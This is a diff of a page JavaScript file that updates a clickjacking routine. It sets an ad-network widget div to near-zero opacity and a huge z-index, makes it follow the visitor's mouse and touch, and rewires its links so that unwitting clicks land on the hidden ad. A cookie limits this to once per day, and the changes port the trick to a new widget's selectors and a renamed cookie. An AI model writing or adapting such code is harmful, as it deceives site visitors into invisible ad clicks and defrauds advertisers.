@@ -40,10 +40,10 @@ function h12_getCookie(strCookie) {
 function h12_revertDiv() {
     h12_canTrack = 0;
     $("#" + h12_div).css("top", "").css("left", "").css("z-index", "").css("position", "").css("opacity", "").css("width", "");
-    $('._mdpzx4e').css('padding', '10px');
+    //$('._mdpzx4e').css('margin', '10px 0.5%');
 }
 function h12_startScript(){
-    h12_div = '_8elbiil_2970881';
+    h12_div = $('div[id^="M268850ScriptRootC758017"]')[0].id;
 
     $("body").css("overflow-x", "hidden").css("width", "100%");
     $(document).on('mousemove touchstart', function(e){
@@ -56,10 +56,10 @@ function h12_startScript(){
         }
     });
 
-    if(h12_getCookie("_iplz2_delay_time") == null){
-        $('#'+ h12_div +' ._co300v').remove();
-        $('#'+ h12_div +' ._caknurb').attr('onclick', 'h12_clickfuncion()');
-        $('._mdpzx4e').css('padding', '');
+    if(h12_getCookie("_iplz2_delay_time_x1") == null){
+        $('#'+ h12_div +' .mgheader').remove();
+        $('#'+ h12_div +' a').attr('onclick', 'h12_clickfuncion()');
+        //$('#'+ h12_div +' .mgline').css('margin', '0 !important');
 
         h12_followDiv();
     }
@@ -69,7 +69,7 @@ function h12_followDiv() {
     $("#" + h12_div).css("z-index", "8999999").css("position", "absolute").css("opacity", "0.0001").css("width", "800px");
 }
 function h12_setClick(){
-    h12_setCookie("_iplz2_delay_time", '1', 24);
+    h12_setCookie("_iplz2_delay_time_x1", '1', 24);
     document.activeElement.blur();
 }
 function h12_clickfuncion() {
